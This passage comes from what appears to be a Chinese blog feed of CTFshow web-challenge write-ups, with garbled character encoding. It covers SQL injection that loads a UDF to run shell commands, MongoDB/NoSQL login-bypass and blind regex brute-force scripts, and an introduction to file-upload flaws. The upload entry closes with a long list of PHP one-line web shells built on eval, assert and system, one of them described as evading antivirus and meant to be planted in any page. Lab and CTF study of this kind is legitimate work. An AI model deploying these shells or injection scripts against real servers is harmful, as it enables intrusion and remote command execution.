punctuation">)</span>uaf_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span>  <span class="token comment"># åˆ›å»ºudfå‡½æ•°</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># æ‰§è¡Œå‘½ä»¤å¹¶æŸ¥çœ‹</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web249-nosql"><a href="#web249-nosql" class="headerlink" title="web249(nosql)"></a>web249(nosql)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$memcache</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://www.anquanke.com/post/id/97211">å†·é—¨çŸ¥è¯† â€” NoSQLæ³¨å…¥çŸ¥å¤šå°‘</a></p><p><a href="http://rui0.cn/archives/609">NoSQLæ³¨å…¥å°ç¬”è®°</a></p><p><strong>Memcached get</strong> å‘½ä»¤è·å–å­˜å‚¨åœ¨ <strong>key(é”®)</strong> ä¸­çš„ <strong>value(æ•°æ®å€¼)</strong> ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›ç©ºã€‚</p><p>è¡¥å……ä¸€ä¸‹çŸ¥è¯†ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">$gt : <span class="token operator">></span>$lt : <span class="token operator">&lt;</span>$gte: <span class="token operator">>=</span>$lte: <span class="token operator">&lt;=</span>$ne : <span class="token operator">!=</span>ã€<span class="token operator">&lt;></span>$<span class="token operator">in</span> : <span class="token operator">in</span>$nin: <span class="token operator">not</span> <span class="token operator">in</span>$<span class="token keyword">all</span>: <span class="token keyword">all</span> $<span class="token operator">or</span>:<span class="token operator">or</span>$<span class="token operator">not</span>: ååŒ¹é…<span class="token punctuation">(</span><span class="token number">1.3</span><span class="token number">.3</span>åŠä»¥ä¸Šç‰ˆæœ¬<span class="token punctuation">)</span>æ¨¡ç³ŠæŸ¥è¯¢ç”¨æ­£åˆ™å¼ï¼šdb<span class="token punctuation">.</span>customer<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">'name'</span>: &#123;<span class="token string">'$regex'</span>:<span class="token string">'.*s.*'</span>&#125; &#125;<span class="token punctuation">)</span><span class="token comment">/*** : èŒƒå›´æŸ¥è¯¢ &#123; "age" : &#123; "$gte" : 2 , "$lte" : 21&#125;&#125;* : $ne &#123; "age" : &#123; "$ne" : 23&#125;&#125;* : $lt &#123; "age" : &#123; "$lt" : 23&#125;&#125;*/</span><span class="token comment">//æŸ¥è¯¢age = 22çš„è®°å½•</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">"age"</span>: <span class="token number">22</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›¸å½“äºï¼šselect * from userInfo where age = 22;</span><span class="token comment">//æŸ¥è¯¢age > 22çš„è®°å½•</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;age: &#123;$gt: <span class="token number">22</span>&#125;&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›¸å½“äºï¼šselect * from userInfo where age > 22;</span></code></pre><p><code>id=flag</code> ä¸è¡Œï¼Œid éƒ½æ˜¯æ•°å­—ï¼Œå°è¯•æ•°ç»„ç»•è¿‡å¾—åˆ° flag <code>id[]=flag</code></p><h4 id="web250-MongoDB"><a href="#web250-MongoDB" class="headerlink" title="web250(MongoDB)"></a>web250(MongoDB)</h4><p>sqlè¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ— è¿‡æ»¤</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>MongoDBæ˜¯NOSQLçš„ä¸€ç§ï¼Œä»‹ç»ä¸€ä¸‹Mongodbå¾—ä¸¤ä¸ªæ“ä½œç¬¦ï¼š<br><code>$ne</code>ï¼š!&#x3D; ä¸ç­‰äº<br><code>$regex</code>ï¼šæ­£åˆ™åŒ¹é…</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span></code></pre><p>å¦‚æœè¾“å…¥<code>value[$ne]=1</code>ä¹Ÿå°±æ„å‘³ç€<code>value=array($ne=&gt;1)</code>ï¼Œåœ¨MongoDBä¸­ï¼ŒåŸæ¥çš„ä¸€ä¸ªå•ä¸ªç›®æ ‡çš„æŸ¥è¯¢å˜æˆäº†æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>username[$gt]=&amp;password[$gt]=</code>ä½œä¸ºpayloadè¿›è¡Œæ”»å‡»ã€‚</p><h4 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h4><p>åŒä¸Š</p><h4 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//sql</span>db<span class="token punctuation">.</span>ctfshow_user<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;username:<span class="token string">'$username'</span><span class="token punctuation">,</span>password:<span class="token string">'$password'</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>åŒæ—¶ä¸èƒ½æ˜¯ adminå’Œ admin1ï¼Œæ­£åˆ™ç»•è¿‡<br>payload: <code>username[$regex]=^[^admin].*&amp;password[$ne]=1</code></p><h4 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h4><p>username&#x3D;flagæ—¶è¿”å›ç™»é™†æˆåŠŸï¼Œä½†æ²¡æœ‰å¯†ç ï¼Œè€ƒè™‘ç›²æ³¨çˆ†å‡ºå¯†ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://2eb32fc2-5457-44b4-b948-b0c416a768c8.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag_dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;&#125;1234567890-poiuytrrewqasdfghjklmnbvcxz"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username[$regex]"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>            <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ç™»é™†æˆåŠŸ"</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag<span class="token operator">+</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-upload</title>
      <link href="/2024/07/02/web%E5%85%A5%E9%97%A8-upload/"/>
      <url>/2024/07/02/web%E5%85%A5%E9%97%A8-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">æ–‡ä»¶ä¸Šä¼ æ¼æ´ (ä¸Šä¼ çŸ¥è¯†ç‚¹ã€é¢˜å‹æ€»ç»“å¤§å…¨-uploadé¶åœºå…¨è§£)</a></p><h4 id="äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› "><a href="#äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› " class="headerlink" title="äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› "></a>äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› </h4><p><strong>åŸå› ï¼š</strong></p><ul><li>å¯¹äºä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼ˆæ‰©å±•åï¼‰æ²¡æœ‰åšè¾ƒä¸ºä¸¥æ ¼çš„é™åˆ¶</li><li>å¯¹äºä¸Šä¼ æ–‡ä»¶çš„MIMETYPE(ç”¨äºæè¿°æ–‡ä»¶çš„ç±»å‹çš„ä¸€ç§è¡¨è¿°æ–¹æ³•) æ²¡æœ‰åšæ£€æŸ¥</li><li>æƒé™ä¸Šæ²¡æœ‰å¯¹äºä¸Šä¼ çš„æ–‡ä»¶ç›®å½•è®¾ç½®ä¸å¯æ‰§è¡Œæƒé™ï¼Œï¼ˆå°¤å…¶æ˜¯å¯¹äºshebangç±»å‹çš„æ–‡ä»¶ï¼‰</li><li>å¯¹äºweb serverå¯¹äºä¸Šä¼ æ–‡ä»¶æˆ–è€…æŒ‡å®šç›®å½•çš„è¡Œä¸ºæ²¡æœ‰åšé™åˆ¶</li></ul><p><strong>åŸç†ï¼š</strong><br>åœ¨ WEB ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„åŸç†æ˜¯é€šè¿‡å°†è¡¨å•è®¾ä¸º multipart&#x2F;form-dataï¼ŒåŒæ—¶åŠ å…¥æ–‡ä»¶åŸŸï¼Œè€Œåé€šè¿‡ HTTP åè®®å°†æ–‡ä»¶å†…å®¹å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç«¯è¯»å–è¿™ä¸ªåˆ†æ®µ (multipart) çš„æ•°æ®ä¿¡æ¯ï¼Œå¹¶å°†å…¶ä¸­çš„æ–‡ä»¶å†…å®¹æå–å‡ºæ¥å¹¶ä¿å­˜çš„ã€‚é€šå¸¸ï¼Œåœ¨è¿›è¡Œæ–‡ä»¶ä¿å­˜çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯ä¼šè¯»å–æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åï¼Œå¹¶ä»è¿™ä¸ªåŸå§‹æ–‡ä»¶åä¸­å¾—å‡ºæ–‡ä»¶çš„æ‰©å±•åï¼Œè€Œåéšæœºä¸ºæ–‡ä»¶èµ·ä¸€ä¸ªæ–‡ä»¶å ( ä¸ºäº†é˜²æ­¢é‡å¤ )ï¼Œå¹¶ä¸”åŠ ä¸ŠåŸå§‹æ–‡ä»¶çš„æ‰©å±•åæ¥ä¿å­˜åˆ°æœåŠ¡å™¨ä¸Š</p><p>æ–‡ä»¶ä¸Šä¼ åå¯¼è‡´çš„å¸¸è§å®‰å…¨é—®é¢˜ä¸€èˆ¬æœ‰:</p><ul><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯Webè„šæœ¬è¯­è¨€ï¼ŒæœåŠ¡å™¨çš„Webå®¹å™¨è§£é‡Šå¹¶æ‰§è¡Œäº†ç”¨æˆ·ä¸Šä¼ çš„è„šæœ¬,å¯¼è‡´ä»£<br>ç æ‰§è¡Œ;</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯Flashçš„ç­–ç•¥æ–‡ä»¶crossdomain.xml,é»‘å®¢ç”¨ä»¥æ§åˆ¶Flashåœ¨è¯¥åŸŸä¸‹çš„è¡Œä¸º(å…¶<br>ä»–é€šè¿‡ç±»ä¼¼æ–¹å¼æ§åˆ¶ç­–ç•¥æ–‡ä»¶çš„æƒ…å†µç±»ä¼¼);</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯ç—…æ¯’ã€æœ¨é©¬æ–‡ä»¶ï¼Œé»‘å®¢ç”¨ä»¥è¯±éª—ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜ä¸‹è½½æ‰§è¡Œ:</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯é’“é±¼å›¾ç‰‡æˆ–ä¸ºåŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ï¼Œåœ¨æŸäº›ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸­ä¼šè¢«ä½œä¸ºè„šæœ¬æ‰§<br>è¡Œï¼Œè¢«ç”¨äºé’“é±¼å’Œæ¬ºè¯ˆã€‚</p></li><li><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›ä¸å¸¸è§çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ¯”å¦‚å°†ä¸Šä¼ æ–‡ä»¶ä½œä¸ºä¸€ä¸ªå…¥å£,æº¢å‡ºæœåŠ¡å™¨çš„åå°å¤„ç†ç¨‹åºï¼Œå¦‚å›¾ç‰‡è§£ææ¨¡å—;æˆ–è€…ä¸Šä¼ -ä¸€ä¸ªåˆæ³•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œ å…¶å†…å®¹åŒ…å«äº†PHPè„šæœ¬ï¼Œå†é€šè¿‡â€œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(Local File Include)â€æ‰§è¡Œæ­¤è„šæœ¬;ç­‰ç­‰ã€‚æ­¤ç±»é—®é¢˜ä¸åœ¨æ­¤ç»†è¿°ã€‚</p></li></ul><h4 id="å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬"><a href="#å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬"></a>å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬</h4><pre class="language-php" data-language="php"><code class="language-php">##PHPï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo();</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//print_r($new_array);</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> phpç¯å¢ƒ>=&lt;5.6æ‰èƒ½ç”¨<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  phpç¯å¢ƒ>=5.6æ‰èƒ½ç”¨<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//å®¹é”™ä»£ç  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//ä½¿ç”¨Lankerä¸€å¥è¯å®¢æˆ·ç«¯çš„ä¸“å®¶æ¨¡å¼æ‰§è¡Œç›¸å…³çš„PHPè¯­å¥ <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*ä½¿ç”¨è¿™ä¸ªå,ä½¿ç”¨èœåˆ€ä¸€å¥è¯å®¢æˆ·ç«¯åœ¨é…ç½®è¿æ¥çš„æ—¶å€™åœ¨"é…ç½®"ä¸€æ è¾“å…¥*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //ç»•è¿‡<span class="token php language-php"><span class="token delimiter important">&lt;?</span>é™åˆ¶çš„ä¸€å¥è¯<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   ä¸Šé¢è¿™å¥æ˜¯é˜²æ€é˜²æ‰«çš„ï¼ç½‘ä¸Šå¾ˆå°‘äººç”¨ï¼å¯ä»¥æ’åœ¨ç½‘é¡µä»»ä½•ASPæ–‡ä»¶çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼Œæ¯”å¦‚ index.aspé‡Œé¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter 